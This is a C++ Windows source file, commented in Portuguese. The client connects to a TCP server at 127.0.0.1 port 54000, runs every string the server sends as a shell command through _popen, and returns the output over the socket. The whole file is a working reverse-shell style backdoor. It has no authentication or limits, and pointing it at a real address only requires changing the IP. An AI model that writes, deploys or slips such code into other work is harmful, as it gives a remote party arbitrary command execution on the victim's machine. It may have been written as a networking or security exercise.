#include "pch.h"
#include <iostream>
#include <WS2tcpip.h>
#include <string>
#include <array>
#pragma comment(lib, "ws2_32.lib")

using namespace std;

std::string executeCommand(std::string command)
{
    cout << "Executing: " << command;
    std::string result = "";
    std::array<char, 128> buffer;
    FILE* pipe(_popen(command.c_str(), "r"));
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (!feof(pipe)) {
        if (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
            result += buffer.data();
        }
    }
    _pclose(pipe);
    //cout << "receiving: " << result;
    return result;
}

void main()
{
    string ipAddress = "127.0.0.1";
    int port = 54000;

    // Inicializa o WinSock
    WSADATA data;
    WORD ver = MAKEWORD(2, 2);
    int wsResult = WSAStartup(ver, &data);
    if (wsResult != 0)
    {
        cerr << "Não é possível iniciar o Winsock, erro " << wsResult << endl;
        return;
    }

    // Cria o socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET)
    {
        cerr << "Não é possível criar o socket, erro " << WSAGetLastError() << endl;
        WSACleanup();
        return;
    }

    // Preenche uma estrutura de dicas
    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);

    // Conecta ao servidor
    int connectionResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
    if (connectionResult == SOCKET_ERROR)
    {
        cerr << "Não é possível conectar com o servidor, erro# " << WSAGetLastError() << endl;
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Envia "padaria"
    //send(sock, "padaria", 8, 0);
    // Recendo
    char buf[4096];
    ZeroMemory(buf, 4096);
    string in = "teste do servidor";
    while (true)
    {
        int bytesReceived = recv(sock, buf, 4096, 0);
        if (bytesReceived > 0)
        {
            string serverMsg(buf, 0, bytesReceived);
            cout << "Received from server: " << serverMsg << endl;
            string resultCmd = executeCommand(serverMsg);
            int sendResult = send(sock, resultCmd.c_str(), resultCmd.size(), 0);
        }
    }
    // Feche o socket
    closesocket(sock);
    // Feche o winsock
    WSACleanup();
}